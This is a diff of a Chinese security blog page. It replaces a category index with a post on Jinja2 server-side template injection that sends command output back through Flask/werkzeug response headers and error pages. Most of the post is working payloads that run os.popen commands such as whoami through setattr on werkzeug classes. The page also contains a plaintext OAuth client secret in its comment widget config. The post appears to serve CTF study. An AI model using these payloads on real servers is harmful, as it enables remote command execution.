@@ -4,8 +4,11 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="分类: 原型链污染, ctf*web*student">
-    <meta name="description" content="早岁已知世事艰,仍许飞鸿荡云间">
+    <meta name="keywords" content="Jinjia2-SSTI请求头回显, ctf*web*student">
+    <meta name="description" content="主要还是payload对于原理不进行过多描述
+Server回显一直听Mash1r0.师傅讲请求头回显，第五届封神台也是碰到了能请求头回显的ssti，就来学习一下
+这个利用方式比较新，据说只要是打jaijia2的ssti应该都能打。
+我们先看">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -17,7 +20,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>分类: 原型链污染 | 青云阁</title>
+    <title>Jinjia2-SSTI请求头回显 | 青云阁</title>
     <link rel="icon" type="image/png" href="/favicon.png">
     
 
@@ -360,215 +363,524 @@
 
 </header>
 
-    <div class="bg-cover pd-header about-cover">
-    <div class="container">
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/22.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">Jinjia2-SSTI请求头回显</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
     <div class="row">
-    <div class="col s10 offset-s1 m8 offset-m2 l8 offset-l2">
-        <div class="brand">
-            <div class="title center-align">
-                
-                YUNiversity的个人博客
-                
-            </div>
-
-            <div class="description center-align">
-                
-                <span id="subtitle"></span>
-                <script src="/libs/typed/typed.js"></script>
-                <script>
-                    var typed = new Typed("#subtitle", {
-                        strings: [ 
-                            
-                                "从来没有真正的绝境, 只有心灵的迷途",
-                            
-                                "Never really desperate, only the lost of the soul",
-                            
-                        ],
-                        startDelay: 300,
-                        typeSpeed: 100,
-                        loop: true,
-                        backSpeed: 50,
-                        showCursor: true
-                    });
-                </script>
-                
-            </div>
-        </div>
-    </div>
-</div>
-
-
-<script>
-    // 每天切换 banner 图.  Switch banner image every day.
-    var bannerUrl = "/medias/banner/" + new Date().getDay() + '.jpg';
-    $('.bg-cover').css('background-image', 'url(' + bannerUrl + ')');
-</script>
-<script>
-    
-      var bannerUrl = "/medias/featureimages/" + Math.floor(Math.random() * 24) + '.jpg';
-    
-    $('.bg-cover.about-cover').css('background-image', 'url(' + bannerUrl + ')');
-
-</script>
-
-
-    </div>
-</div>
-
-<main class="content">
-
-    
-
-<div id="category-cloud" class="container chip-container">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
     <div class="card">
-        <div class="card-content">
-            <div class="tag-title center-align">
-                <i class="fas fa-bookmark"></i>&nbsp;&nbsp;文章分类
-            </div>
-            <div class="tag-chips">
-                
-                
-                
-                <a href="/categories/ssti/" title="ssti: 1">
-                    <span class="chip center-align waves-effect waves-light
-                             chip-default "
-                            style="background-color: #F9EBEA;">ssti
-                        <span class="tag-length">1</span>
-                    </span>
-                </a>
-                
-                
-                <a href="/categories/php%E7%89%B9%E6%80%A7/" title="php特性: 1">
-                    <span class="chip center-align waves-effect waves-light
-                             chip-default "
-                            style="background-color: #F5EEF8;">php特性
-                        <span class="tag-length">1</span>
-                    </span>
-                </a>
-                
-                
-                <a href="/categories/%E5%BD%92%E7%BA%B3%E6%95%B4%E7%90%86/" title="归纳整理: 1">
-                    <span class="chip center-align waves-effect waves-light
-                             chip-default "
-                            style="background-color: #D5F5E3;">归纳整理
-                        <span class="tag-length">1</span>
-                    </span>
-                </a>
-                
-                
-                <a href="/categories/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%EF%BC%8Cnodejs/" title="原型链污染，nodejs: 1">
-                    <span class="chip center-align waves-effect waves-light
-                             chip-default "
-                            style="background-color: #E8F8F5;">原型链污染，nodejs
-                        <span class="tag-length">1</span>
-                    </span>
-                </a>
-                
-                
-                <a href="/categories/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="序列化与反序列化: 1">
-                    <span class="chip center-align waves-effect waves-light
-                             chip-default "
-                            style="background-color: #FEF9E7;">序列化与反序列化
-                        <span class="tag-length">1</span>
-                    </span>
-                </a>
-                
-                
-                <a href="/categories/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" title="原型链污染: 1">
-                    <span class="chip center-align waves-effect waves-light
-                             chip-active "
-                            style="background-color: #F8F9F9;">原型链污染
-                        <span class="tag-length">1</span>
-                    </span>
-                </a>
-                
-                
-                <a href="/categories/nodejs/" title="nodejs: 1">
-                    <span class="chip center-align waves-effect waves-light
-                             chip-default "
-                            style="background-color: #82E0AA;">nodejs
-                        <span class="tag-length">1</span>
-                    </span>
-                </a>
-                
-                
-                <a href="/categories/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" title="文件上传: 1">
-                    <span class="chip center-align waves-effect waves-light
-                             chip-default "
-                            style="background-color: #D7BDE2;">文件上传
-                        <span class="tag-length">1</span>
-                    </span>
-                </a>
-                
-                
-            </div>
-        </div>
-    </div>
-</div>
-
-
-    
-
-    <article id="articles" class="container articles">
-        <div class="row tags-posts">
-            
-            <div class="article tag-post col s12 m6 l4" data-aos="zoom-in">
-                <div class="card">
-                    <a href="/2025/04/17/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">
-                        <div class="card-image tag-image">
-                            
-                            
-                            <img src="/img/loading.gif" data-original="/medias/featureimages/8.jpg" class="responsive-img" alt="python原型链污染">
-                            
-                            <span class="card-title">python原型链污染</span>
-                        </div>
-                    </a>
-                    <div class="card-content article-content">
-                        <div class="summary block-with-text">
-                            
-                                基础payload直接污染static目录
-data = {
-    "__init__":{
-        "__globals__":{
-                "app":{
-                        
-                            
-                        </div>
-                        <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2025-04-17
-                            </span>
-                            <span class="publish-author">
-                                
-                                <i class="fas fa-bookmark fa-fw icon-category"></i>
-                                
-                                <a href="/categories/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" class="post-category">
-                                    原型链污染
-                                </a>
-                                
-                                
-                            </span>
-                        </div>
-                    </div>
-
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
                     
-                    <div class="card-action article-tags">
+                    <div class="article-tag">
                         
-                        <a href="/tags/Web/">
-                            <span class="chip bg-color">Web</span>
-                        </a>
+                            <a href="/tags/SSTI/">
+                                <span class="chip bg-color">SSTI</span>
+                            </a>
                         
-                        <a href="/tags/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">
-                            <span class="chip bg-color">python原型链污染</span>
-                        </a>
+                            <a href="/tags/Web/">
+                                <span class="chip bg-color">Web</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/ssti/" class="post-category">
+                                ssti
+                            </a>
                         
                     </div>
                     
                 </div>
             </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2025-04-29
+                </div>
+                
+
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
+                    2025-05-09
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    805
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                    3 分
+                </div>
+                
+
+                
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+
+        
+        <!-- 代码块折行 -->
+        <style type="text/css">
+            code[class*="language-"], pre[class*="language-"] { white-space: pre-wrap !important; }
+        </style>
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <p>主要还是payload对于原理不进行过多描述</p>
+<h1 id="Server回显"><a href="#Server回显" class="headerlink" title="Server回显"></a>Server回显</h1><p>一直听<font style="color:rgb(0, 0, 0);">Mash1r0.师傅讲请求头回显，第五届封神台也是碰到了能请求头回显的ssti，就来学习一下</font></p>
+<p>这个利用方式比较新，据说只要是打jaijia2的ssti应该都能打。</p>
+<p>我们先看看回包的结构：</p>
+<p><img src="/img/loading.gif" data-original="https://cdn.nlark.com/yuque/0/2025/png/52815563/1745469263731-cc4b17de-49e1-40a5-a15f-80503c522f99.png"><br>注意这里的Serverr，Data回显,对于原出题人的说法是在flask中存在一个Server头：</p>
+<p><img src="/img/loading.gif" data-original="https://cdn.nlark.com/yuque/0/2025/png/52815563/1745470661475-190d97c2-baac-4dcc-9d22-1d6fda36904b.png"></p>
+<p>然后这个sever头有两个部分server_version和sys_version：	</p>
+<p><img src="/img/loading.gif" data-original="https://cdn.nlark.com/yuque/0/2025/png/52815563/1745470686196-2d1e7446-111d-4606-83f4-dca594425120.png"></p>
+<p>这两个值是WSGIRequestHandler类中的属性，这里可以更改环境中的server_version或者sys_version的值来获取回显。</p>
+<p>中间的代码跟进不再演示</p>
+<p>server_version调用的是WSGIRequestHandler类的server_version()方法：</p>
+<p><img src="/img/loading.gif" data-original="https://cdn.nlark.com/yuque/0/2025/png/52815563/1745500454369-c17b9c1d-7df9-4c32-ba0e-badb996e3478.png"></p>
+<p>利用点就是在这里，这里的方法为什么可以利用，重点在于它的@property装饰器，这个的介绍如下：</p>
+<ul>
+<li>这是一个装饰器，使用这个装饰器，可以将一个方法转换为属性，也就是说使用这个装饰器的方法，可以使其在访问时可以像访问属性一样，它把方法包装成属性，让方法可以以属性的形式被访问或调用。</li>
+</ul>
+<p>也就是说，这个方法其实就等同于下面这种调用：</p>
+<p>self.server_version=self.server._server_version</p>
+<p>所以可以直接给它赋str类型的值。后面再来根据过程来给出payload</p>
+<p>现在已经知道了对象，那么怎么获取到对象呢，即怎么获取到werkzeug.serving.WSGIRequestHandler对象，在这里我们可以通过使利用sys模块来获取到相关对象，</p>
+<p>就是通过sys模块来获取到相关类，在原型链污染中学习了如何获取到sys模块，所以payload如下：</p>
+<pre class="line-numbers language-language-python"><code class="language-language-python">{{lipsum.__globals__.__builtins__.setattr(lipsum.__spec__.__init__.__globals__.sys.modules.werkzeug.serving.WSGIRequestHandler,"server_version",lipsum.__globals__.__builtins__['__import__']('os').popen('chdir').read())}}
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>同样的还可以利用这个sys_version，只不过这里是直接调用的类的属性：</p>
+<p>像server_version一样的“调用方法”。所以payload如下：</p>
+<pre><code>{{lipsum.__globals__.__builtins__.setattr(lipsum.__spec__.__init__.__globals__.sys.modules.werkzeug.serving.WSGIRequestHandler,"sys_version",lipsum.__globals__.__builtins__['__import__']('os').popen('chdir').read())}}
+</code></pre>
+<p>获取sys模块不只这种，同样的还存在于全局变量中，所以其实直接获取即可，如下payload：</p>
+<pre><code>{{url_for.__globals__.__builtins__.setattr(url_for.__globals__.sys.modules.werkzeug.serving.WSGIRequestHandler,"sys_version",url_for.__globals__.__builtins__['__import__']('os').popen('whoami').read())}}
+</code></pre>
+<p>参考文章的payload如下：</p>
+<pre><code>{{g.pop.__globals__.__builtins__.setattr(g.pop.__globals__.sys.modules.werkzeug.serving.WSGIRequestHandler,"server_version",g.pop.__globals__.__builtins__.__import__('os').popen('whoami').read())}}
+</code></pre>
+<h1 id="响应头扩展"><a href="#响应头扩展" class="headerlink" title="响应头扩展"></a>响应头扩展</h1><pre><code>{{url_for.__globals__.__builtins__.setattr(url_for.__globals__.sys.modules.werkzeug.serving.WSGIRequestHandler,"request_version",url_for.__globals__.__builtins__['__import__']('os').popen('whoami').read())}}
+</code></pre>
+<p>回显的HTTP/1.1，并且是str类型，所以应该是可以如下利用的：</p>
+<pre><code>{{url_for.__globals__.__builtins__.setattr(url_for.__globals__.sys.modules.werkzeug.serving.WSGIRequestHandler,"protocol_version",url_for.__globals__.__builtins__['__import__']('os').popen('whoami').read())}}
+</code></pre>
+<h1 id="错误页面回显"><a href="#错误页面回显" class="headerlink" title="错误页面回显"></a>错误页面回显</h1><p>比如方法错误的回显，或者500页面的回显：</p>
+<p>状态码回显</p>
+<pre><code>{{url_for.__globals__.__builtins__.setattr(url_for.__globals__.sys.modules.werkzeug.wrappers.Response,"default_status",url_for.__globals__.__builtins__['__import__']('os').popen('whoami').read())}}
+</code></pre>
+<p>改404页面的（先传payload再人为构造错误页面）：</p>
+<pre><code>{{url_for.__globals__.__builtins__.setattr(url_for.__globals__.sys.modules.werkzeug.exceptions.NotFound,"description",url_for.__globals__.__builtins__['__import__']('os').popen('whoami').read())}}
+</code></pre>
+<p>405的：</p>
+<pre><code>{{url_for.__globals__.__builtins__.setattr(url_for.__globals__.sys.modules.werkzeug.exceptions.MethodNotAllowed,"description",url_for.__globals__.__builtins__['__import__']('os').popen('whoami').read())}}
+</code></pre>
+<p>500的：</p>
+<pre><code>{{url_for.__globals__.__builtins__.setattr(url_for.__globals__.sys.modules.werkzeug.exceptions.InternalServerError,"description",url_for.__globals__.__builtins__['__import__']('os').popen('whoami').read())}}
+</code></pre>
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">YUNiversity</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://example.com/2025/04/29/Jinjia2-SSTI%E8%AF%B7%E6%B1%82%E5%A4%B4%E5%9B%9E%E6%98%BE/">https://example.com/2025/04/29/Jinjia2-SSTI%E8%AF%B7%E6%B1%82%E5%A4%B4%E5%9B%9E%E6%98%BE/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">YUNiversity</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/SSTI/">
+                                    <span class="chip bg-color">SSTI</span>
+                                </a>
+                            
+                                <a href="/tags/Web/">
+                                    <span class="chip bg-color">Web</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
             
         </div>
-    </article>
+    </div>
+
+    
+        <link rel="stylesheet" href="/libs/gitalk/gitalk.css">
+<link rel="stylesheet" href="/css/my-gitalk.css">
+
+<div class="card gitalk-card" data-aos="fade-up">
+    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; padding-left: 20px; top: 15px; padding-bottom: 5px;">
+        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
+        <span>评论</span>
+    </div>
+    <div id="gitalk-container" class="card-content"></div>
+</div>
+
+<script src="/libs/gitalk/gitalk.min.js"></script>
+<script>
+    let gitalk = new Gitalk({
+        clientID: 'Ov23liqpRCaMYrbZl9QE',
+        clientSecret: '2c85ab1376564dd1afa4e272a158bdf7b743f9bc',
+        repo: '评论',
+        owner: 'AYUNiversity',
+        admin: "AYUNiversity",
+        id: '2025-04-29T23-04-18',
+        distractionFreeMode: false  // Facebook-like distraction free mode
+    });
+
+    gitalk.render('gitalk-container');
+</script>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
+            <div class="card">
+                <a href="/2025/04/29/Jinjia2-SSTI%E8%AF%B7%E6%B1%82%E5%A4%B4%E5%9B%9E%E6%98%BE/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/img/loading.gif" data-original="/medias/featureimages/22.jpg" class="responsive-img" alt="Jinjia2-SSTI请求头回显">
+                        
+                        <span class="card-title">Jinjia2-SSTI请求头回显</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2025-04-29
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/ssti/" class="post-category">
+                                    ssti
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/SSTI/">
+                        <span class="chip bg-color">SSTI</span>
+                    </a>
+                    
+                    <a href="/tags/Web/">
+                        <span class="chip bg-color">Web</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2025/04/29/PHP_=7.4.21%20Development%20Server%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/img/loading.gif" data-original="/medias/featureimages/0.jpg" class="responsive-img" alt="PHP_=7.4.21 Development Server源码泄露漏洞">
+                        
+                        <span class="card-title">PHP_=7.4.21 Development Server源码泄露漏洞</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2025-04-29
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/php%E7%89%B9%E6%80%A7/" class="post-category">
+                                    php特性
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/Web/">
+                        <span class="chip bg-color">Web</span>
+                    </a>
+                    
+                    <a href="/tags/PHP/">
+                        <span class="chip bg-color">PHP</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
 </main>
 
 
